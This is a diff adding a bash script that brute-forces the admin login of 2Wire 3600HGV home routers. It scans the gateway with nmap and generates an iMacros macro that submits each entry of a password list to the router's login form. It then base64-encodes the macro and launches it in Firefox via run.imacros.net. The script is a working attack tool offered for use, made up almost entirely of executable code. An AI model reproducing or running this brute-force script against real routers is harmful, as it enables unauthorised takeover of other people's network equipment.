@@ -1,0 +1,67 @@
+#!/bin/bash
+set -x
+
+
+# Usage
+# $0 gateway
+# ./2Wire 192.168.0.1
+
+# Tested on 2Wire 3600HGV 
+gateway="$1"
+interface="$2"
+time_wait="2"                                         # Increase this if Firefox fails to open fast enough - 2 should be enough
+model="$3"
+
+if [ ! -d /tmp/menu ] ; then mkdir /tmp/menu ; fi
+
+
+
+nmap -oN /tmp/menu/nmap_$model -p80,443 $gateway -e $interface
+
+
+brute_port=$(grep open /tmp/menu/nmap_$model | head -n 1 | awk '{ print $3 }') 
+
+wget -O /tmp/menu/router_page $brute_port://$gateway/
+ver="$(cat /tmp/menu/router_page | grep "3600HGV")"                                  # Check if model has been tested
+# if [ "$ver" == "" ] ; then 
+#    read -p "[!] This is NOT a $model 3600HGV - Module May Not Work - Try Anyway??? [Enter]"  # Provide Warning if Not
+#    if [ $REPLY == "q" ] ; then
+#       echo Goodbye
+#    fi
+# else
+   pass_list="/root/Desktop/current/attack/router/brute/short_list"
+   #  Macro header and blank password are put in first
+   echo "VERSION BUILD=7601105 RECORDER=FX
+   TAB T=1
+   URL GOTO=http://gateway.2wire.net/xslt?PAGE=C_0_1
+   SET !ENCRYPTION NO
+   TAG POS=1 TYPE=INPUT:PASSWORD FORM=NAME:pagepost ATTR=NAME:ADM_PASSWORD CONTENT=
+   TAG POS=1 TYPE=INPUT:SUBMIT FORM=ID:pagepost ATTR=VALUE:Submit" > /tmp/menu/macro.tmp
+   # If list is too long the macro will not start
+   target=( $(cat "$pass_list") )
+   for i in "${target[@]}"; do
+      echo "SET !ENCRYPTION NO
+      TAG POS=1 TYPE=INPUT:PASSWORD FORM=NAME:pagepost ATTR=NAME:ADM_PASSWORD CONTENT=$i
+      TAG POS=1 TYPE=INPUT:SUBMIT FORM=ID:pagepost ATTR=VALUE:Submit" >> /tmp/menu/macro.tmp
+   done
+
+   imacro_code="$(cat /tmp/menu/macro.tmp)"
+
+   echo "$imacro_code" | openssl enc -base64 > /tmp/tmp
+   sed '$!N;s/\n/ /' /tmp/tmp > /tmp/tmp1                    # Yeah I know - I don't Know how to use SED properly
+   sed '$!N;s/\n/ /' /tmp/tmp1 > /tmp/tmp                    # But it works
+   sed '$!N;s/\n/ /' /tmp/tmp > /tmp/tmp1
+   sed '$!N;s/\n/ /' /tmp/tmp1 > /tmp/tmp
+   sed '$!N;s/\n/ /' /tmp/tmp > /tmp/tmp1
+   sed '$!N;s/\n/ /' /tmp/tmp1 > /tmp/tmp
+   sed 's/ //g' /tmp/tmp > /tmp/tmp1                         # Removes blank spaces
+
+
+   code="$(cat /tmp/tmp1)"
+   rm -rf /tmp/tmp1 /tmp/tmp
+   firefox &                                           # Firefox needs to be open already for this to work
+
+   sleep $time_wait                                               # Increase this if Firefox fails to open fast enough
+   firefox "http://run.imacros.net/?code=$code" &        # Runs the IMacro code
+# return
+# fi
